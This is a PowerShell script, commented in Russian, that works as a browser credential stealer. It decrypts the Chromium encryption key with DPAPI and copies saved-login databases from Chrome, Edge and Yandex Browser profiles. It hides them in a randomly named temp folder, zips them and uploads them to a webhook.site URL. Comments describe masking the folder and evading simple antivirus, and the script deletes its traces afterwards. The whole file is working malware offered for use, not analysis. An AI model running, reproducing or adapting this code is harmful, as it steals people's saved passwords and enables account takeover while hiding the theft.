# Принудительно TLS 1.2 для обхода блокировок соединения
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Твой уникальный URL с Webhook.site
$u = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"

# Рандомное имя папки для маскировки
$tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
New-Item -ItemType Directory -Path $tmp -Force > $null

Add-Type -AssemblyName System.Security

function Get-Key($p, $l) {
    if (Test-Path $p) {
        try {
            $j = Get-Content $p -Raw | ConvertFrom-Json
            $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
            $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
            "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath "$tmp\sys.log" -Append
            return $true
        } catch { return $false }
    }
    return $false
}

# Сбор Chromium (Chrome, Edge, Yandex)
$paths = @(
    @{n="CH"; p="Google\Chrome\User Data"},
    @{n="ED"; p="Microsoft\Edge\User Data"},
    @{n="YX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $paths) {
    $target = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $target) {
        $files = Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($f in $files) {
            $label = "$($b.n)_$($f.Directory.Name)"
            if (Get-Key (Join-Path $target "Local State") $label) {
                Copy-Item $f.FullName -Destination "$tmp\$label.dat" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# Упаковка и низкоуровневая отправка
if ((Get-ChildItem $tmp).Count -gt 0) {
    $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 4 | % {[char]$_}) ).zip"
    Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force

    try {
        # Прямое использование .NET HttpClient (невидимо для простых антивирусов)
        $client = New-Object System.Net.Http.HttpClient
        $content = New-Object System.Net.Http.MultipartFormDataContent
        $fileStream = [System.IO.File]::OpenRead($z)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        
        $content.Add($fileContent, "file", "data.bin")
        $response = $client.PostAsync($u, $content).Result
        
        $fileStream.Close(); $fileStream.Dispose(); $content.Dispose(); $client.Dispose()
    } catch {}

    if (Test-Path $z) { Remove-Item $z -Force }
}

Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
